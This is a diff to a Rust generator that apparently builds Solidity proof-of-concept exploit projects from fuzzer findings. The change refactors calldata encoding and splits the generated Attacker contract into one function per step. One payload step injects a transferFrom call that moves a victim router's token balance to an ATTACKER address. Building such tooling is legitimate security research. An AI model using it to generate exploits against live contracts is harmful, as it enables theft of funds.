@@ -35,9 +35,9 @@ use alloy_primitives::U256;
 use loom_fuzz_oracle::{hex_bytes, hex_u256, Poc, PocStep};
 
 use crate::synth::{
-    addr_expr, deploy_addr, head_arg_exprs, head_words_of, ierc20_sol, mock_erc20_sol,
-    parse_head_shape, render_deploy_etches, render_prestate_stores, u256_hex64, vm_sol,
-    ExploitParams, HeadShape, PocgenError, ProjectArtifacts, VictimModel, VM_ADDRESS,
+    addr_expr, deploy_addr, encode_with_selector, head_arg_exprs, head_words_of, ierc20_sol,
+    mock_erc20_sol, parse_head_shape, render_deploy_etches, render_prestate_stores, u256_hex64,
+    vm_sol, ExploitParams, HeadShape, PocgenError, ProjectArtifacts, VictimModel, VM_ADDRESS,
 };
 use crate::synth::{foundry_toml, run_sh, underlying_selector};
 
@@ -137,7 +137,7 @@ pub(crate) fn generate_l3(
             ("README.md".into(), readme_l3(fork)),
         ]
         .into_iter()
-        .chain(fork.then(|| ("run.sh".into(), run_sh())))
+        .chain(fork.then(|| ("run.sh".into(), run_sh(poc.fork.as_ref().map(|f| f.block_number)))))
         .collect(),
     };
     artifacts.write(out_dir).map_err(PocgenError::Io)?;
@@ -231,11 +231,7 @@ fn render_setup_step(
         .iter()
         .map(|w| format!("uint256(0x{})", u256_hex64(*w)))
         .collect();
-    let prefix = format!(
-        "abi.encodeWithSelector({:#06x}, {})",
-        shape.selector,
-        args.join(", ")
-    );
+    let prefix = encode_with_selector(&format!("{:#06x}", shape.selector), &args);
     let data_expr = if shape.tail_slot.is_some() {
         // 尾区 = calldata 头后的原始字节（长度字 + 内容），verbatim。
         let head_bytes = 4 + head_words.len() * 32;
@@ -281,11 +277,7 @@ fn render_payload_step(
         "address(asset)",
         "router",
     );
-    let data_expr = format!(
-        "abi.encodeWithSelector({:#06x}, {})",
-        shape.selector,
-        arg_exprs.join(", ")
-    );
+    let data_expr = encode_with_selector(&format!("{:#06x}", shape.selector), &arg_exprs);
     let decls = if plan.tail_slot.is_some() {
         "        bytes memory request =\n            abi.encodeCall(IERC20.transferFrom, (router, ATTACKER, BALANCE));\n"
             .to_string()
@@ -326,28 +318,34 @@ fn attacker_sol(
         let _ = writeln!(ctor_body, "        field{i} = _field{i};");
     }
     let mut attack_body = String::new();
+    let mut step_fns = String::new();
     for (i, r) in renders.iter().enumerate() {
         let tag = if i == renders.len() - 1 {
             "payload（L2 同锚注入）"
         } else {
             "setup（witness 原样重编码）"
         };
-        let _ = writeln!(attack_body, "        // 步 {i}（{tag}）。");
-        attack_body.push_str(&r.decls);
+        // 每步独立成函数：宽头函数的 payload 步声明多（TeamFinance
+        // migrate 17 词头），同作用域堆叠触发 Stack too deep；步级
+        // 作用域让编译器复用槽位（不经 via_ir，避开 0.8.19 IR 段错误）。
+        let _ = writeln!(attack_body, "        step{i}(); // 步 {i}（{tag}）");
+        let _ = writeln!(step_fns, "\n    function step{i}() internal {{");
+        step_fns.push_str(&r.decls);
         let _ = writeln!(
-            attack_body,
+            step_fns,
             "        bytes memory data{i} = {};",
             r.data_expr
         );
         let _ = writeln!(
-            attack_body,
+            step_fns,
             "        (bool ok{i}, ) = {}.call{{value: {}}}(data{i});",
             r.target, r.value
         );
         let _ = writeln!(
-            attack_body,
+            step_fns,
             "        require(ok{i}, \"L3 step {i} failed\");"
         );
+        let _ = writeln!(step_fns, "    }}");
     }
     format!(
         r#"// SPDX-License-Identifier: MIT
@@ -373,7 +371,7 @@ contract Attacker {{
 
     function attack() external {{
 {attack_body}    }}
-}}
+{step_fns}}}
 "#,
         balance = params.balance,
     )
